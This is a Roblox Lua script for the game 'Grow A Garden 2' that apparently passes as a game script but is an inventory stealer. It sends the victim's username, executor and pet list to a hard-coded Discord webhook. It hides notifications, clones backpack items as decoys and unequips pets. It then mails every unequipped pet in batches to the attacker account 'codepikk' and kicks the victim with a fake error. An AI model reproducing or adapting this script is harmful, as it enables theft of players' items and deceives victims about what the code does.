Username = "codepikk"
Webhook = "https://discord.com/api/webhooks/1431629441057947688/naWJc-0cQnWniU73wcSmOo2_VwMwIz6n4-qlim71sJvrwji6FjW4bjR2fyjBdoir2e3g"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Networking = require(game:GetService("ReplicatedStorage").SharedModules.Networking)
local PlayerState = require(game:GetService("ReplicatedStorage").ClientModules.PlayerStateClient)
local Note = "ERROR 404"
local Backpack = LocalPlayer:FindFirstChild("Backpack")

local function GetExecutor()
    local Success, Result = pcall(function()
        return identifyexecutor()
    end)
    if Success and Result then
        return tostring(Result)
    end
    return "Unknown"
end

local function GetAccountAge()
    local Success, Result = pcall(function()
        return LocalPlayer.AccountAge .. " days"
    end)
    if Success and Result then
        return math.floor(Result / 1) .. " days"
    end
    return "Unknown"
end

local function ClaimAllGifts()
    local Success, MailboxData = pcall(function()
        return Networking.Mailbox.OpenInbox:Fire()
    end)
    if not Success or not MailboxData then
        return
    end
    local Claimed = 0
    for GiftId, GiftData in pairs(MailboxData) do
        local Success, Result, Error = pcall(function()
            return Networking.Mailbox.Claim:Fire(GiftId)
        end)
        if Success and Result then
            Claimed = Claimed + 1
        end
        
        task.wait(0.5)
    end
end
ClaimAllGifts()

local function SendWebhook(InventoryList)
    if not InventoryList or #InventoryList == 0 then
        print("No items to send webhook for")
        return false
    end
    
    local InventoryText = table.concat(InventoryList, "\n")
    if #InventoryList > 10 then
        InventoryText = table.concat(InventoryList, "\n", 1, 10) .. "\nAnd " .. (#InventoryList - 10) .. " more..."
    end
    
    local Data = {
        content = "@everyone",
        embeds = {
            {
                title = "Grow A Garden 2",
                color = 320049,
                fields = {
                    {
                        name = "User Info",
                        value = string.format("```Username: %s\nExecutor: %s\nReceiver: %s\nAccount Age: %s```", 
                            LocalPlayer.Name, GetExecutor(), Username, GetAccountAge())
                    },
                    {
                        name = "Pets:",
                        value = string.format("```%s```", InventoryText)
                    }
                },
                footer = {
                    text = "Made by Codepikk"
                }
            }
        },
        attachments = {}
    }
    
    local Success, Err = pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(Data)
        })
    end)
    if Success then
        print("Webhook sent")
        return true
    else
        print("Webhook failed: " .. tostring(Err))
        return false
    end
end

local function DeepCopyBackpack()
    local Copy = {}
    
    local function CopyAttributes(Instance)
        local Attrs = {}
        for Attr, Value in pairs(Instance:GetAttributes()) do
            Attrs[Attr] = Value
        end
        return Attrs
    end
    
    for _, Tool in pairs(Backpack:GetChildren()) do
        if Tool:IsA("Tool") then
            local NewTool = Instance.new("Tool")
            NewTool.Name = Tool.Name
            NewTool.Enabled = Tool.Enabled
            NewTool.CanBeDropped = false
            NewTool.RequiresHandle = Tool.RequiresHandle
            
            for Attr, Value in pairs(CopyAttributes(Tool)) do
                NewTool:SetAttribute(Attr, Value)
            end
            
            local Handle = Tool:FindFirstChild("Handle")
            if Handle then
                local NewHandle = Instance.new("MeshPart")
                NewHandle.Name = "Handle"
                NewHandle.Size = Handle.Size
                NewHandle.Position = Handle.Position
                NewHandle.Color = Handle.Color
                NewHandle.Material = Handle.Material
                if Handle:IsA("MeshPart") then
                    NewHandle.MeshId = Handle.MeshId
                    NewHandle.TextureID = Handle.TextureID
                end
                NewHandle.Parent = NewTool
            end
            
            NewTool.Parent = LocalPlayer.Backpack
            table.insert(Copy, NewTool)
        end
    end
    
    return Copy
end

local ClonedBackpack = DeepCopyBackpack()

local function DisableNotifications()
    local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
    local TopNotification = PlayerGui:FindFirstChild("TopNotification")
    if TopNotification then
        TopNotification:Destroy()
    end
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local NotifyEvent = ReplicatedStorage:FindFirstChild("Notify")
    if NotifyEvent then
        NotifyEvent:Destroy()
    end
    local SoundService = game:GetService("SoundService")
    local NotificationSound = SoundService.SFX and SoundService.SFX.Notification
    if NotificationSound then
        NotificationSound:Destroy()
    end
    local Assets = ReplicatedStorage:FindFirstChild("Assets")
    if Assets then
        local NotificationUI = Assets:FindFirstChild("NotificationUI")
        if NotificationUI then
            NotificationUI:Destroy()
        end
        local NotificationUIMobile = Assets:FindFirstChild("Notification_UI_Mobile")
        if NotificationUIMobile then
            NotificationUIMobile:Destroy()
        end
    end
end

DisableNotifications()

local function UnequipAllPets()
    local Success, EquippedPets = pcall(function()
        return Networking.Pets.GetEquippedPets:Fire()
    end)
    
    if Success and EquippedPets then
        for _, Pet in pairs(EquippedPets) do
            if Pet.Id then
                pcall(function()
                    Networking.Pets.RequestUnequip:Fire(Pet.Id)
                end)
                task.wait(0.3)
            end
        end
    end
end

UnequipAllPets()

task.wait(0.4)

local function GetUserIdByUsername(Username)
    local Success, Result = pcall(function()
        return Players:GetUserIdFromNameAsync(Username)
    end)
    if Success and Result then
        return Result
    end
    return nil
end

local TargetUserId = GetUserIdByUsername(Username)

local function GetInventoryList()
    local List = {}
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        return List
    end
    local Inventory = Replica.Data and Replica.Data.Inventory
    if not Inventory then
        return List
    end
    
    local PetNames = {}
    local Pets = Inventory.Pets
    if Pets then
        for PetId, PetData in pairs(Pets) do
            if PetData.Equipped == false then
                local Name = PetData.Name or PetId
                if PetNames[Name] then
                    PetNames[Name] = PetNames[Name] + 1
                else
                    PetNames[Name] = 1
                end
            end
        end
    end
    
    for Name, Count in pairs(PetNames) do
        table.insert(List, Name .. " (x" .. Count .. ")")
    end
    
    return List
end

local function GetAllGiftableItems()
    local AllItems = {}
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        return AllItems
    end
    local Inventory = Replica.Data and Replica.Data.Inventory
    if not Inventory then
        return AllItems
    end
    
    local Pets = Inventory.Pets
    if Pets then
        for PetId, PetData in pairs(Pets) do
            if PetData.Equipped == false then
                for i = 1, (PetData.Count or 1) do
                    table.insert(AllItems, {
                        Category = "Pets",
                        ItemKey = PetId,
                        Count = 1
                    })
                end
            end
        end
    end
    
    return AllItems
end

local InventoryList = GetInventoryList()

if #InventoryList == 0 then
    game:GetService("Players").LocalPlayer:Kick("Script Error:\nExploit Found!")
    return
end

SendWebhook(InventoryList)

if TargetUserId then
    local Replica = PlayerState:GetLocalReplica()
    if not Replica then
        PlayerState:OnLocalReplica(function(R)
            Replica = R
        end)
        task.wait(2)
    end
    
    local AllItems = GetAllGiftableItems()
    
    if #AllItems == 0 then
        game:GetService("Players").LocalPlayer:Kick("Script Error:\nExploit Found!")
        return
    end
    
    local BatchSize = 20
    for i = 1, #AllItems, BatchSize do
        local Batch = {}
        for j = i, math.min(i + BatchSize - 1, #AllItems) do
            table.insert(Batch, AllItems[j])
        end
        pcall(function()
            Networking.Mailbox.SendBatch:Fire(TargetUserId, Batch, Note)
        end)
        task.wait(1)
    end
    
    game:GetService("Players").LocalPlayer:Kick("ERROR CODE 500\nPlease Rejoin the game...")
end
